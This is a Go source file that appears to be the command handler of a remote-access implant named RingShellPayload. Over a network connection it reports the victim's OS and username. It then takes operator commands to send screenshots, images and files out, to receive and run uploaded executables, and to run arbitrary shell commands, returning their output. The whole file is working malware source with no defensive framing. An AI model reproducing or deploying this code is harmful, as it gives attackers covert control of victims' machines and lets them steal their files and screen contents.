package Handler

import (
	"bufio"
	"errors"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"strings"
	"time"

	"github.com/MustafaAbdulazizHamza/RingShellPayload/Files"
	"github.com/MustafaAbdulazizHamza/RingShellPayload/Pics"
)

func Handle(conn net.Conn) {
	defer conn.Close()
	reader := bufio.NewReader(conn)
	writer := bufio.NewWriter(conn)
	usr, err := user.Current()
	if err != nil {
		return
	}
	data := fmt.Sprintf("%s.%s\n", runtime.GOOS, usr.Username)
	writer.WriteString(data)
	writer.Flush()
	for {
		cmd, _ := reader.ReadString('\n')
		cmd = strings.TrimSpace(cmd)
		commands := strings.Split(cmd, " ")

		if commands[0] == "get" {
			switch commands[1] {
			case "screenshots":
				if err := Pics.SendScreenshots(conn); err != nil {
					return
				}
			case "image":
				for _, imageName := range commands[2:] {
					err := Pics.SendImageFromPath(conn, imageName)
					if os.IsNotExist(err) {
						if _, err := writer.WriteString("file is not exist\n"); err != nil {
							return
						}
						continue
					}
				}
			case "file":
				for _, fileName := range commands[2:] {
					if err := Files.SendFileContents(fileName, conn, 30*time.Second); errors.Is(err, os.ErrNotExist) {
						continue
					} else if err != nil {
						return
					}
				}
			default:

			}

		} else if commands[0] == "upload" {
			switch commands[1] {
			case "file":
			case "executable":
				for _, fileName := range commands[2:] {
					if err := Files.ReceiveFileContents(fileName, conn, 30*time.Second); err != nil {
						if errors.Is(err, os.ErrNotExist) {
							continue
						} else {
							return
						}
					}
					if commands[1] == "executable" {
						if err := executeFile(fileName); err != nil {
							continue
						}
					}
				}
			}

		} else {
			out := execute(strings.Split(cmd, " "))
			_, err := writer.Write(out)
			if err != nil && err != io.EOF {
				return
			}
			if err := writer.Flush(); err != nil {
				return
			}
		}
	}
}

func execute(cmd []string) []byte {
	if len(cmd) == 2 && cmd[0] == "cd" {
		if info, _ := os.Stat(cmd[1]); !info.IsDir() {
			return []byte(fmt.Sprintf("Error, The directory %s was not found", cmd[1]))
		}
		if err := os.Chdir(cmd[1]); err != nil {
			return []byte(fmt.Sprint(err))
		}
		return []byte("done")
	} else {
		if runtime.GOOS == "windows" {
			command := exec.Command("cmd.exe", "/C", strings.Join(cmd, " "))
			out, err := command.Output()
			if err != nil {
				return []byte(fmt.Sprint(err))
			}
			if out == nil || len(out) == 0 {
				out = []byte("No output returned.")
			}

			return out
		}
		command := exec.Command(cmd[0], cmd[1:]...)
		out, err := command.CombinedOutput()
		if err != nil {
			return []byte(fmt.Sprint(err))
		}
		if out == nil || len(out) == 0 {
			out = []byte("No output returned.")
		}
		return out
	}
}
